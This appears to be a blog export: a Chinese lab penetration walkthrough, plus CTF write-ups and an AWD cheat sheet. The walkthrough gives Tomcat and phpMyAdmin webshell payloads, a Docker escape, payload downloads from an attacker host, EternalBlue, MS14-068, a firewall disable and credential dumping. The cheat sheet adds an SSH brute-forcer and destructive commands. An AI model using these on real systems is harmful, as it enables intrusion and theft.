DC、Win7、Ubuntu。Ubuntu为双网卡，这里我添加的是NAT。\n靶机登录密码\n外网服务器：ubuntuubuntu:ubuntu 域成员机器 win7douser:Dotest123 DC:administrator:Test2008\n\n需要在Ubuntu中开启 docker 服务\nsudo docker start ec 17 09 bb da 3d ab ad\n\n\n\n\n\n\n\n\n各个虚拟机拿到的ip\nKali\n\n\n\n\n\n\n\nUbuntu\n\n\n\n\n\n\n\nWin7\n\n\n\n\n\n\n\n*注意 win7的IP后续因为靶机重启后会在183.6 或 183.7之间改变 *\nDC\n\n\n\n\n\n\n\n外网打点主机发现nmap -sn 172.20.10.1/24\n\n\n\n\n\n\n\n\n这里扫出来172.20.10.5 这台机器，另外两个ip分别是网关 和 kali。\n端口扫描sudo nmap -sS -Pn -sV -v -p 1-65535 172.20.10.5\n\n\n\n\n\n\n\n\n分别开放了22、2001、2002、2003四个端口。\nTomcat CVE-2017-12615漏洞利用在2002端口中发现tomcat页面\n\n\n\n\n\n\n\n从页面中得到tomcat版本为8.5.19，通过搜索引擎发现存在文件写入漏洞。\n可以通过该脚本直接一键利用\nhttps://github.com/cyberheartmi9/CVE-2017-12617/\n\n\n\n\n\n\n\n\n也可以手工。\n首先用burp抓一个访问tomcat主页的包\n\n\n\n\n\n\n\n然后将请求包改为如下\n\n\n\n\n\n\n\nPUT /shell.jsp/ HTTP/1.1Host: 172.20.10.5:2002User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateConnection: closeUpgrade-Insecure-Requests: 1Cache-Control: max-age=0Content-Type: application/x-www-form-urlencodedContent-Length: 612&lt;%@page import=&quot;java.util.*,javax.crypto.*,javax.crypto.spec.*&quot;%&gt;&lt;%!class U extends ClassLoader&#123;U(ClassLoader c)&#123;super(c);&#125;public Class g(byte []b)&#123;return super.defineClass(b,0,b.length);&#125;&#125;%&gt;&lt;%if (request.getMethod().equals(&quot;POST&quot;))&#123;String k=&quot;e45e329feb5d925b&quot;;/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/session.putValue(&quot;u&quot;,k);Cipher c=Cipher.getInstance(&quot;AES&quot;);c.init(2,new SecretKeySpec(k.getBytes(),&quot;AES&quot;));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);&#125;%&gt;\n\n访问 \nhttp://172.20.10.5:2002/shell.jsp\n\n\n\n\n\n\n\n\n没有回显，但是可以肯定的是已经存在这个文件了。\n因为是使用的冰蝎马，直接使用冰蝎客户端进行连接。\n\n\n\n\n\n\n\n成功连接上。\nphpmyadmin CVE-2018-12613漏洞利用在 2003端口中发现，一个无需登录的 phpmyadmin页面\n\n\n\n\n\n\n\n一个phpmyadmin站点，发现版本号为4.8.1，这个版本存在一个文件包含漏洞 CVE-2018-12613\n首先，检测是否存在文件包含漏洞\nhttp://172.20.10.5:2003/?target=tbl_zoom_select.php?/../../../../../../etc/passwd\n\n\n\n\n\n\n\n\n把/etc/passwd文件读取出来，是存在文件包含漏洞的。\n接下来，在test数据库中创建一张表，名字随便取\n\n\n\n\n\n\n\n然后，字段名字这插入一句话木马\n\n\n\n\n\n\n\n查看浏览器的session值\n\n\n\n\n\n\n\ne7bec897077c4a99f9e6e5da0bed67b5\n\n访问\nhttp://172.20.10.5:2003/?target=tbl_zoom_select.php?/../../../../../../tmp/sess_e7bec897077c4a99f9e6e5da0bed67b5&amp;cmd=phpinfo();\n\n\n\n\n\n\n\n\n通过蚁剑连接\n\n\n\n\n\n\n\n连接不上。\n利用file_put_contents写马\nhttp://172.20.10.5:2003/?target=tbl_zoom_select.php?/../../../../../../tmp/sess_e7bec897077c4a99f9e6e5da0bed67b5&amp;cmd=file_put_contents(&quot;/var/www/html/shell.php&quot;, base64_decode(&quot;PD9waHAgZXZhbCgkX1BPU1RbJ2NtZCddKTs/Pg==&quot;));\n\nPD9waHAgZXZhbCgkX1BPU1RbJ2NtZCddKTs/Pg==&lt;?php eval($_POST[&apos;cmd&apos;]);?&gt;\n\n访问\n\n\n\n\n\n\n\n蚁剑连接\n\n\n\n\n\n\n\n这里成功就拿到了一个webshell权限，接下来，我们将利用该webshell上线MSF的shell\n利用webshell派生MSF shell（失败）生成反弹shell\nmsfvenom -p linux/x64/meterpreter/bind_tcp lport=9999 -f elf &gt; shell9999\n\n通过蚁剑上传到靶机的/tmp目录下\n\n\n\n\n\n\n\nMSF开启监听\nuse exploit/multi/handlerset payload linux/x64/meterpreter/bind_tcpset rhost 172.20.10.5set lport 9999exploit\n\n执行\n\n\n\n\n\n\n\n回到msf中\n\n\n\n\n\n\n\n根本就没连接上，目标靶机根本没有打开9999端口。\n\n\n\n\n\n\n\nDocker逃逸ls -alh /.dockerenvcat /proc/1/cgroup\n\n\n\n\n\n\n\n\n发现该web服务存在于docker环境下。\n\n如果是通过特权模式启动容器，就可以获得大量设备文件的访问权限，因为管理员执行docker run —privileged时，Docker容器将被允许访问主机上的所有设备，并可以执行mount命令进行挂载。\n\n利用方式\n创建一个目录用于挂载\nmkdir /tmp/test\n\n挂载\nmount /dev/sda1 /tmp/test\n\n这里通过2003端口 phpmyadmin打下来webhsell，是没有权限执行的\n\n\n\n\n\n\n\n网上说，需要通过 2002的tomcat拿到的shell，才行。\n切换到tomcat的shell中，执行\nmkdir /tmp/testmount /dev/sda1 /tmp/test\n\n\n\n\n\n\n\n\n成功将 /dev/sda1 挂载到 /tmp/test下\n目前我们已经可以访问物理机当中的所有文件，所以这里的利用思路有两种，一种是，在kali中创建一个用户，然后在/etc/passwd和/etc/shadow中该用户的信息复制出来，写入到靶机 /etc/passwd和/etc/shadow下，这样我们就可以用ssh连接上去了。另一种是直接写入 ssh密钥。\n第一种方式：通过写入passwd和shadow文件创建用户(失败)首先在kali中创建用户\n# 添加用户sudo useradd test1# 设置密码为 qwe123!@#（这里如果设置的密码太简单会出现登录不上去）sudo passwd test1# 修改test用户登录的shell为/bin/bashsudo chsh -s /bin/bash test1\n\n\n\n\n\n\n\n\n查看 passwd 和 shadow中信息\ntest1:x:3004:3005::/home/test1:/bin/bash\n\ntest1:$y$j9T$B4j3Ux49X5pTOdjWZVEgX0$4iknEZjD18G72k.OLguby8s8bKAdkKXWzEBve48wpbC:19355:0:99999:7:::\n\n接着在靶机中的passwd和shadow中追加的方式写入上面的信息 \necho &quot;test1:x:3004:3005::/home/test1:/bin/bash&quot; &gt;&gt; /tmp/test/etc/passwdecho &quot;test1:$y$j9T$B4j3Ux49X5pTOdjWZVEgX0$4iknEZjD18G72k.OLguby8s8bKAdkKXWzEBve48wpbC:19355:0:99999:7:::&quot; &gt;&gt; /tmp/test/etc/shadow\n\nssh连接\n\n\n\n\n\n\n\n连不上，一直提示密码错误，也不知道那个环节出现了问题。\n使用第二种方式：ssh密钥写入首先生成rsa密钥\nssh-keygen -t rsa\n\n\n\n\n\n\n\n\n进入到/home/kali/.ssh/目录下，用python开启一个http服务\npython3 -m http.server\n\n切换到冰蝎客户端下\n进入到 /tmp/test/home/ubuntu/.ssh 目录下，执行\nwget http://172.20.10.129:8000/id_rsa.pub\n\n\n\n\n\n\n\n\n将 id_rsa.pub.1 重命名为 authorized_keys\nmv id_rsa.pub.1 authorized_keys\n\n赋予 644权限\nchmod 644 authorized_keys\n\n然后回到kali中\nssh ubuntu@172.20.10.5\n\n\n\n\n\n\n\n\n成功免密码登录\n权限维持接下来，在MSF中上线该靶机\n生成木马\nmsfvenom -p linux/x64/meterpreter/bind_tcp lport=9988 -f elf &gt; shell9988\n\n上传至靶机\n使用python 开启http服务器\npython3 -m http.server\n\n在刚刚登录的shell中下载\nwget http://172.20.10.129:8000/shell9988\n\n\n\n\n\n\n\n\nMSF开启监听\n\n\n\n\n\n\n\n赋予权限并执行\nchmod u+x shell9988./shell9988\n\n\n\n\n\n\n\n\n成功上线\n\n\n\n\n\n\n\n方便后续进行操作。\n内网信息收集查看网卡信息\nifconfig\n\n\n\n\n\n\n\n\n发现内网网段\n上传fscan进行扫描\n./fscan_amd64 -h 192.168.183.1/24\n\n\n\n\n\n\n\n\n(icmp) Target 192.168.183.5   is alive(icmp) Target 192.168.183.6   is alive(icmp) Target 192.168.183.130 is alive[*] Icmp alive hosts len is: 3192.168.183.5:22 open192.168.183.130:139 open192.168.183.6:445 open192.168.183.6:139 open192.168.183.130:445 open192.168.183.6:135 open192.168.183.130:135 open192.168.183.130:88 open192.168.183.5:9988 open[*] alive ports len is: 9start vulscan[*] NetInfo:[*]192.168.183.6   [-&gt;]TESTWIN7-PC   [-&gt;]192.168.183.6[*] NetInfo:[*]192.168.183.130   [-&gt;]WIN-ENS2VR5TR3N   [-&gt;]192.168.183.130[+] 192.168.183.130     MS17-010        (Windows Server 2008 HPC Edition 7601 Service Pack 1)[*] NetBios: 192.168.183.6   TESTWIN7-PC.demo.com                Windows 7 Enterprise 7601 Service Pack 1 [*] NetBios: 192.168.183.130 [+]DC WIN-ENS2VR5TR3N.demo.com      Windows Server 2008 HPC Edition 7601 Service Pack 1 [+] 192.168.183.6       MS17-010        (Windows 7 Enterprise 7601 Service Pack 1)已完成 8/9 [-] ssh 192.168.183.5:22 root 123qwe ssh: handshake failed: ssh: unable to authenticate, attempted methods [none password], no supported methods remain\n\n从fscan的扫描结果中可以得知，192.168.183.130是域控服务器，该主机的操作系统为 Windows Server 2008 HPC Edition 7601 Service Pack 1，并且存在永恒之蓝漏洞。192.168.183.6是域成员服务器，该主机的操作系统为 Windows 7 Enterprise 7601 Service Pack 1，并且也存在永恒之蓝漏洞。\n横向移动准备在MSF中，我们刚刚已经上线了外网的靶机。\n接下来，给MSF添加通向内网的路由\nrun post/multi/manage/autoroute\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n内网渗透：域成员服务器 win7永恒之蓝漏洞利用use exploit/windows/smb/ms17_010_eternalblueset rhosts 192.168.183.6set payload windows/x64/meterpreter/bind_tcp\n\n\n\n\n\n\n\n\n试了几次依旧失败，可能是MSF自带的添加路由功能不够稳定，换 frp 做代理。\nfrp 开启socks5代理服务首先再kali中开启frp服务器\nfrps.ini\n[common]bind_port = 7000\n\n./frps -c frps.ini\n\n\n\n\n\n\n\n\n将frp客户端上传至ubuntu 靶机中，然后按如下方式启动\nfrpc.ini\n[common]server_addr = 172.20.10.129 server_port = 7000[socks5]type = tcpremote_port = 8088plugin = socks5\n\n./frpc -c frpc.ini\n\n\n\n\n\n\n\n\n接下来，首先remove移除掉MSF中添加的路由，如果这一步没做，也可能导致利用不成功。\nroute del 网段 掩码 session\n\n\n\n\n\n\n\n\n手动一条条删除，没找到删除全部的办法。\n接下来，使用给MSF配置全局代理\nsetg proxies socks5:127.0.0.1:8088\n\n\n\n\n\n\n\n\n再次使用exploit/windows/smb/ms17_010_eternalblue进行利用\n\n这里win的 IP 由 192.168.183.6 变成了 192.168.183.8\n\n\n\n\n\n\n\n\n一次成功\n主机信息收集在meterpreter加载kiwi\nload kiwi\n\n执行 获取用户登录口令\n\n\n\n\n\n\n\n一堆看不太懂的字符串，但是却没有拿到用户登录口令。\n进入shell\n\n\n\n\n\n\n\n解决乱码问题\nchcp 65001\n\n创建一个用户\nnet user fany qwe123@ /addnet localgroup administrators fany /add\n\n\n\n\n\n\n\n\n开启远程桌面服务\nrun post/windows/manage/enable_rdp\n\n\n\n\n\n\n\n\n使用 kali 中的 rdesktop远程连接上去\nproxychains4 rdesktop 192.168.183.7# 登录口令 fany:qwe123@\n\n\n\n\n\n\n\n\n再次回到meterpreter终端中，执行\ncreds_all\n\n\n\n\n\n\n\n\ndouser        DEMO         Dotest123fany          testwin7-PC  qwe123@\n\n就抓到了域用户的登录口令明文。\n\n如果像上边一样抓不到，就需要自己手动在靶机中登录一次。\n\nMS14-068域用户权限提升拿到SIDwhoami /all\n\n\n\n\n\n\n\n\n通过以上信息收集可以得到\n域用户名：douser域名：DEMO.comSID：S-1-5-21-979886063-1111900045-1414766810-1107域控地址：192.168.183.130域成员密码：Dotest123\n\n生成高权限票据命令\nMS14-068.exe -u 域成员名@域名 -s 域成员sid -d 域控制器地址 -p 域成员密码\n\nMS14-068.exe -u douser@DEMO.com -s S-1-5-21-979886063-1111900045-1414766810-1107 -d 192.168.183.130 -p Dotest123\n\n在当前靶机的桌面目录c:\\Users\\douser\\Desktop ，已经准备好了MS14-068提权执行文件。\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n通过 mimikatz 导入TGT票据将写入，从而提升为域管理员kerberos::purgekerberos::ptc TGT_douser@DEMO.COM.ccache\n\n\n\n\n\n\n\n\n验证dir \\\\WIN-ENS2VR5TR3N\\c$\n\n\n\n\n\n\n\n\n可以访问到域控的c盘目录。\n内网渗透：域控服务器\n域控服务器是存在永恒之蓝漏洞的，但是由于开启了防火墙，因为是使用正向的shell，服务启动了，防火墙没有开放该端口，所以只能检测到，但是利用不了。\n\n渗透过程使用MSF生成一个正向shellmsfvenom -p windows/x64/meterpreter/bind_tcp LPORT=8899 -f exe &gt; 8899.exe\n\n\n\n\n\n\n\n\n上传到shell域成员服务器中\n注意，这里如果退当前shell再来上传，还需要重新使用mimikatz 导入TGT票据将写入\n\nupload /home/kali/8899.exe c:/\n\n\n\n\n\n\n\n\n关闭域控防火墙sc \\\\WIN-ENS2VR5TR3N create ProFirewall binpath= &quot;netsh advfirewall set allprofiles state off&quot;\n\n\n\n\n\n\n\n\n将payload复制到域控xcopy c:\\8899.exe  \\\\WIN-ENS2VR5TR3N\\c$\n\n\n\n\n\n\n\n\n重新开一个MSF设置监听use exploit/multi/handlerset payload windows/x64/meterpreter/bind_tcpset rhost 192.168.183.130set lport 8899# 开启全局代理setg proxies socks5:127.0.0.1:8088 exploit\n\n\n\n\n\n\n\n\n创建服务并启动sc \\\\WIN-ENS2VR5TR3N create startshell binpath= &quot;C:\\8899.exe&quot;sc \\\\WIN-ENS2VR5TR3N start startshell\n\n\n\n\n\n\n\n\nMSF收到shell\n\n\n\n\n\n\n尝试几次后，发现特别容易断开，执行ps， 找一个稳定得进程，马上迁移进程\n迁移进程ps\n\n\n\n\n\n\n\n\nmigrate 2716\n\n\n\n\n\n\n\n\n主机信息收集加载 kiwiload kiwi\n\n获取用户口令creds_kerberos\n\n\n\n\n\n\n\n\n不是system权限\n提权getsystem\n\n在执行\ncreds_kerberos\n\n\n\n\n\n\n\n\n成功拿到域控的登录口令\nadministrator     DEMO.COM  qwe123!@#\n\n开启3389run post/windows/manage/enable_rdp\n\n\n\n\n\n\n\n\n在windows下配置代理，直接连接\n\n\n\n\n\n\n\n成功拿下。\n参考文章https://blog.csdn.net/qq_36241198/article/details/121619400\nhttps://blog.csdn.net/weixin_42918771/article/details/116207505\nhttps://blog.csdn.net/weixin_54648419/article/details/123732412\n","categories":["内网渗透"],"tags":["内网渗透"]},{"title":"BUUCTF-WEB BUU BRUTE 1 WP","url":"/2021/03/25/BUU%20BRUTE%201%20WP/","content":"考点：密码爆破打开连接\n分析一道登录题，以为是sql注入，其实不是，只是一道简单的4位数字密码爆破题，账号经过测试，存在admin，打开bp，抓包爆破。\n\n\n\n拿到flag\n","categories":["CTF","BUUCTF"],"tags":["CTF","密码爆破"]},{"title":"BUUCTF-WEB BUU CODE REVIEW 1 WP","url":"/2021/03/25/BUU%20CODE%20REVIEW%201%20WP/","content":"考点：绕过md5加密和反序列化打开&lt;?php/** * Created by PhpStorm. * User: jinzhao * Date: 2019/10/6 * Time: 8:04 PM */highlight_file(__FILE__);class BUU &#123;   public $correct = \"\";   public $input = \"\";   public function __destruct() &#123;       try &#123;           $this-&gt;correct = base64_encode(uniqid());           if($this-&gt;correct === $this-&gt;input) &#123;               echo file_get_contents(\"/flag\");           &#125;       &#125; catch (Exception $e) &#123;       &#125;   &#125;&#125;if($_GET['pleaseget'] === '1') &#123;    if($_POST['pleasepost'] === '2') &#123;        if(md5($_POST['md51']) == md5($_POST['md52']) &amp;&amp; $_POST['md51'] != $_POST['md52']) &#123;            unserialize($_POST['obj']);        &#125;    &#125;&#125;\n\n分析一道反序列化题，分析代码后，要拿到flag，必须要达到下面几个条件。\n$_GET[&#39;pleaseget&#39;]===1\n $_POST[&#39;pleasepost&#39;]===2 md5($_POST[&#39;md51&#39;])==md5($_POST[&#39;md52&#39;])&amp;&amp;$_POST[&#39;md51&#39;]!=$_POST[&#39;md52&#39;]\n$this-&gt;correct === $this-&gt;input\n第一个和第二个条件很简单不用说，只需要提交对应的参数和参数值即可。\n第三个条件，可以用数组绕过MD5加密，数组进行MD5加密会返回false。\n构造md51[]=1&amp;md52[]=2 即可绕过\n这才来到最关键的地方，如何在序列化前让$this-&gt;correct === $this-&gt;input 呢？，我们创建BUU类后，重新给$this-&gt;correct 赋值成 $this-&gt;input的值。\n$b1 = new BUU();$b1-&gt;correct=&amp;$b1-&gt;input;print_r(serialize($b1));\n\nO:3:&quot;BUU&quot;:2:&#123;s:7:&quot;correct&quot;;s:0:&quot;&quot;;s:5:&quot;input&quot;;R:2;&#125; # 得到序列化后的内容\n\n提交get\n?pleaseget=1\n\npost\npleasepost=2&amp;md51[]=1&amp;md52[]=2&amp;obj=O:3:&quot;BUU&quot;:2:&#123;s:7:&quot;correct&quot;;s:0:&quot;&quot;;s:5:&quot;input&quot;;R:2;&#125;\n\n拿到flagflag&#123;0f14da5c-5e42-49c2-b2e3-5ee2f9f1e285&#125;\n\n","categories":["CTF","BUUCTF"],"tags":["反序列化","CTF"]},{"title":"CTF-Web【SSRF】漏洞做题姿势积累","url":"/2021/11/08/CTF-Web%E3%80%90SSRF%E3%80%91%E6%BC%8F%E6%B4%9E%E5%81%9A%E9%A2%98%E5%A7%BF%E5%8A%BF%E7%A7%AF%E7%B4%AF/","content":"前言\n本篇文章专门用于记录做SSRF类题目的做题姿势，会不断更新。\n\n相关文章浅入深出 Fastcgi 协议分析与 PHP-FPM 攻击方法\nhttps://whoamianony.top/2021/05/15/Web%E5%AE%89%E5%85%A8/%E6%B5%85%E5%85%A5%E6%B7%B1%E5%87%BA%20Fastcgi%20%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90%E4%B8%8E%20PHP-FPM%20%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95/\n与ssrf相关php相关函数parse_url\n解析 URL，返回其组成部分\n\n&lt;?php$url = 'http://username:password@hostname/path?arg=value#anchor';print_r(parse_url($url));echo parse_url($url, PHP_URL_PATH);?&gt;\n\n输出\nArray(    [scheme] =&gt; http    [host] =&gt; hostname    [user] =&gt; username    [pass] =&gt; password    [path] =&gt; /path    [query] =&gt; arg=value    [fragment] =&gt; anchor)/path\n\ngethostbyname()\n返回主机名对应的 IPv4地址。\n\ncurl_exec\n 执行 cURL 会话\n\n&lt;?php// 创建新的 cURL 资源$ch = curl_init();// 设置 URL 和相应的选项curl_setopt($ch, CURLOPT_URL, \"http://www.example.com/\");curl_setopt($ch, CURLOPT_HEADER, 0);// 抓取 URL 并把它传递给浏览器curl_exec($ch);// 关闭 cURL 资源，并且释放系统资源curl_close($ch);?&gt;\n\n","categories":["CTF","CTF做题姿势总结"],"tags":["CTF","总结"]},{"title":"CTF-AWD攻防方法总结","url":"/2021/11/01/CTF-AWD%E6%94%BB%E9%98%B2%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/","content":"防守&amp;加固\n靶机加固的前提：需要知道靶机的密码和权限\nroot权限可以做所有操作\nweb权限：只能加固web服务，mysql服务等\n\n不知道靶机密码的情况hydra爆破（kali自带）\nSSH 破解hydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns ip sshhydra -l 用户名 -p 密码字典 -t 线程 -o save.log -vV ip ssh\n\npython脚本爆破（需要安装paramiko库）\nimport sys, time, argparseimport paramikoclass ssh_brute(object):    def __init__(self, host, port):        self.host = host        self.port = port    def connect(self, host, port, username, password):        ssh = paramiko.SSHClient()        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())        try:            ssh.connect(hostname=host, port=port, username=username, password=str(password), timeout=0.01)            ssh.close()        except:            print(\"The password:&#123;password&#125; error!\".format(password=password))            ssh.close()            return        print(\"find it!\\nusername:\\033[1;32;40m&#123;username&#125; \\npassword:&#123;password&#125;\\033[0m\".format(username=username, password=password))        exit()    def getpassword(self):        dict = \"C:/Users/root/Desktop/dic.txt\"  #×ÖµäÂ·¾¶        with open(dict) as f:            password = f.readlines()            return password    def main(self):        host = self.host        port = self.port        username = \"root\"        password = self.getpassword()        print(\"[+]host:&#123;host&#125;\".format(host=host))        print(\"[+]username:&#123;username&#125;\".format(username=username))        for paw in password:            paw = paw.strip(\"\\n\")            self.connect(host, port, username, paw)def parse():    parse = argparse.ArgumentParser(\"a ssh brute force crack\")    parse.add_argument(\"-host\", dest=\"host\", default=\"10.20.60.13\", help=\"This is to set ip\")    parse.add_argument(\"-port\", dest=\"port\", default=\"22\", help=\"This is to set port default:22\")    args = parse.parse_args()    return args.host, args.portdef main():    #host, port = parse() //ÃüÁîÐÐ½âÎö    host = '172.20.101.101'    port = '22'    ssh_brute(host, port).main()if __name__ == '__main__':    main()\n\nkali自带字典目录\n/usr/share/wordlists\n\n可能会用到的操作ssh提供rsa公私钥连接方式ssh -i 私钥位置 user@hostname\n\n查看有那些用户cat /etc/passwd | grep /bin/bash\n\n可查看端口对应服务cat /etc/service\n\n查看开了哪些端口  是否存在后门netstat -anp\n\nnetstat -anp|grep &quot;LISTEN&quot;\n\n查看nc对应的进程和端口（其他程序同理，如：bash、python、php等反弹shell）\nnetstat -nlpta|grep -w nc\n\n查看nc进程树\nps aux|grep -w nc\n\n根据pid查找程序绝对路径\nls -l /proc/2765/ | grep -w exe\n\n也可以用 lsof -p pid 命令\nlsof -p pid\n\n按照关掉端口的方式杀掉即可\n关闭端口的方式1 . 强制关闭\nkill -9 端口号\n\n监控日志命令tail -f *.log\n\nscp实现ssh服务上传下载文件上传 \nscp [-P 端口] 本地文件路径 user@host:远程文件路径\n\n下载\nscp [-P 端口] user@host:远程文件路径 本地文件路径\n\n备份网站目录打包网站 备份到/tmp目录下\n\n备份到其他目录可能会因为没有权限而报错\n\ntar -czvf /tmp/html.tar.gz /var/www/html\n\n根据备份的源码恢复网站cd /tmptar -xzvf html.tar.gzmv /tmp/var/www/html/* /var/www/html/\n\n查找后门find /var/www/html -name &quot;*.php&quot; |xargs egrep &apos;assert|eval|phpinfo\\(\\)|\\(base64_decoolcode|shell_exec|passthru|file_put_contents\\(\\.\\*\\$|base64_decode\\(&apos;\n\n查找flag的位置使用`find / -name *flag*` 或`grep -rn &quot;flag&quot; *` 类似的语句可以快速发现 flag 所在的地方，方便后续拿分\n\n修改flag文件权限和设置不可更改修改权限\nchmod 400 /root/flag\n\n设置不可更改属性\nchattr +i /root/flag\n\n克制不死马\n强行kill掉进程后重启服务（不建议）\nps -aux|grep ‘www-data’|awk ‘&#123;print $2&#125;’|xargs kill -9\n\n\n\n\n\n\n写脚本不断删除\n\n&lt;?php    ignore_user_abort(true);    set_time_limit(0);    unlink(__FILE__);    $file = '.3.php'; // 这里修改成不死马文件名    $code = 'hi springbird !';    //pass=pass    while (1)&#123;        file_put_contents($file,$code);    //    usleep(5000);          usleep(1000);    &#125;?&gt;\n\n干掉反弹shellps -ef / px -aux\n出现www-data权限的/bin/sh一般为nc\n如果有一些进程杀不掉可以尝试www-data权限去杀\nkill.php\n&lt;?phpsystem(\"kill `ps -aux | grep www-data | grep apache2 | awk '&#123;print $2&#125;'`\");?&gt;\n\n从浏览器访问，就是www-data权限\n建议连着kill两次\n加固\n方向：更改口令、加固服务、清除后门、备份重要文件、移动系统命令、清楚执行命令的历史记录\n\n\n上靶机，改ssh密码，看端口，根据对应端口做加固操作，无关紧要的端口统统关闭。定时任务一定要看。\n\n更改ssh登录密码passwd\n\n更改vnc登录密码（没有的情况下不用）vncpasswd root\n\n加固web服务器方法php网站加固\n第一种：上waf\n\n一般通防 WAF 会影响主办方 check，使用需谨慎，同时注意上 WAF 崩溃的问题\n\nwaf脚本网上搜集\nwaf的使用方式\n方式一：可以使用 bash 命令在每一个 php 文件前面加上 require_once 包含 WAF 文件\n\n传入的waf文件记得赋予可读可写入权限，不然不能生成文件\n\n# 批量加waf /var/www/html/ 目录下每个 php 文件前加上 &lt;?php require_once \"/tmp/waf.php\";?&gt;find /var/www/html/ -path /var/www/html/124687a7bc37d57cc9ecd1cbd9d676f7 -prune -o  -type f -name '*.php'|xargs  sed -i '1i&lt;?php require_once \"/tmp/waf.php\";?&gt;'\n\nfind /var/www/html -type f -path \"*.php\" | xargs sed -i \"s/&lt;?php/&lt;?phpnrequire_once('./log.php');n/g\"\n\n方式二：修改 php.ini 的 auto_prepend_file 属性，但一般不会有重启 php 服务权限\n; Automatically add files before PHP document.; http://php.net/auto-prepend-fileauto_prepend_file = /tmp/waf.php\n\n第二种：删除web服务器中存在漏洞页面\n单个字符查找（）\ngrep -rn &quot;相关函数名&quot; --include *.php    /var/www/html--include *.php 指定php路径\n\n多字符查找\ngrep -E -rn &quot;字符串1|字符串2|字符串3|&quot;  文件名\n\n一条命令批量加固php代码\nsed -i &quot;s/原字符串/新字符串/g&quot; `grep 原字符串 --include=*.php -rl 所在目录`\n\n注释所有关键函数\n\n注释include需注意，可能会导致网站加载不出来\n\nsed -i \"s/eval/evaleval/g\" `grep eval -rl --include=*.php /var/www/html`sed -i \"s/system/systemsystem/g\" `grep system -rl --include=*.php /var/www/html`\n\n注释掉入口\nsed -i \"s/_GET/GET/g\" `grep _GET -rl --include=*.php /var/www/html`sed -i \"s/_POST/POST/g\" `grep _POST -rl --include=*.php /var/www/html`sed -i \"s/_REQUEST/REQUEST/g\" `grep _REQUEST -rl --include=*.php /var/www/html`sed -i \"s/_FILES/FILES/g\" `grep _FILES -rl --include=*.php /var/www/html`sed -i \"s/_SERVER/SERVER/g\" `grep _SERVER -rl --include=*.php /var/www/html`还原sed -i \"s/GET/_GET/g\" `grep GET -rl --include=*.php /var/www/html`sed -i \"s/POST/_POST/g\" `grep POST -rl --include=*.php /var/www/html`sed -i \"s/REQUEST/_REQUEST/g\" `grep REQUEST -rl --include=*.php /var/www/html`sed -i \"s/FILES/_FILES/g\" `grep FILES -rl --include=*.php /var/www/html`sed -i \"s/SERVER/_SERVER/g\" `grep SERVER -rl --include=*.php /var/www/html`\n\n命令执行漏洞函数\nsystem()popen()passthru()(需要加echo 才能显示结果)exec()shell_exec() ecntl_exec()proc_open()\n\n代码执行函数\neval()assert()preg_replace()create_function()array_map()call_user_func()call_user_func_array()array_filter()usort()uasort()\n\n文件包含函数\ninclude()include_once()require()require_once()\n\n文件读取\nfile_get_contents()fopen()fread()fgets()fgetss()readfile()parse_ini_file()show_source()highlight_file()\n\n文件上传函数\nmove_uploaded_file\n\n文件删除\nunlink()session_destroy()\n\n变量覆盖\nextract()parse_str()import_request_variables()foreach()\n\nsql注入\nmysqli\n\n其他危险函数\ncopy unserialize()`\n\n第三种：删站&amp;赋予不可访问权限\n\n简单粗暴，直接让对手访问不了，但是可能会被裁判服务器check，导致扣分。\n\n删除网站\nrm -rf /var/www/html/*\n\n赋予网站目录 000 权限 \nchmod 000 /var/www/html\n\n重启网页服务器\nservice apache2 restart\n\nJSP网站加固\nrequest upload\n\nsed -i \"s/request/requestrequest/g\" `grep request -rl --include=*.php /var/www/html`sed -i \"s/upload/uploadupload/g\" `grep upload -rl --include=*.php /var/www/html`\n\nAsp加固\nRequestHttpContext\n\nsed -i \"s/Request/RequestRequest/g\" `grep Request -rl --include=*.php /var/www/html`sed -i \"s/HttpContext/HttpContextHttpContext/g\" `grep HttpContext -rl --include=*.php /var/www/html`\n\n加固数据库更改数据库密码第一种方法\nmysql -u root -p [默认密码]use mysql;更改密码update user set password = password(&quot;yangfan&quot;) where User = &apos;root&apos;;刷新权限flush privileges;exit\n\n第二种方法\nupdate user set password = password(&quot;yangfan&quot;) where user = &apos;root&apos;;flush privileges;\n\nmysql 5.7 修改密码\nupdate mysql.user set authentication_string=password(&apos;123qwe&apos;) where user=&apos;root&apos; and Host = &apos;localhost&apos;;\n\nmysql数据库开启远程连接\nuse mysql;update user set host=&apos;%&apos; where host=&apos;localhost&apos;;flush privileges;\n\nmysql数据关闭远程连接\nuse mysql;update use set host=&apos;localhost&apos; where host=&apos;%&apos;;flush privileges;\n\n加固ftp服务修改登录密码\npasswd ftpuser\n\n关闭不需要的服务和守护进程/etc/init.d/vsftpd stop /etc/init.d/smb stop /etc/init.d/sendmail stop\n\n查看守护进程（如果有的话）\ncd /etc/xinetd.d/ ls rm -rf xx\n\n开启内存地址随机化（防止pwn程序的利用）echo 2 &gt; /proc/sys/kernel/randomize_va_space\t// 0是关闭，1是半随机，2是全随机\n\n自启动相关禁用启动项\n开机自启动\nchkconfig 命令开启\nchkconfig 服务名   on\n\n关闭\nchkconfig 服务名 off\n\n防火墙iptables 命令\n定时任务crontable-e 编辑crontab 的工作内容-l 查阅crontab 的工作内容-r 删除所有的crontab工作内容\n\ncat 一次性输入全部内容（在纯linux 下  不能查看前面的内容）more 仅能向前移动，却不能向后移动less 用来查看一页不能完全显示的文件空格 向下翻页n      向上翻页\n移动系统命令（最后的大招）将 /bin，/sbin，/usr/bin 下的全部程序移走，即使攻击者突破了前面的防守但是拿到shell后发现并不能执行系统命令，从而拿不到咱们的flag\nmkdir /etc/tmp cd /etc/tmp mkdir b mkdir sb mkdir ub cp /bin/* /etc/tmp/b cp /sbin/* /etc/tmp/sb cp /usr/bin/* /etc/tmp/ub cd /etc/tmp/b ./rm -rf /bin/* 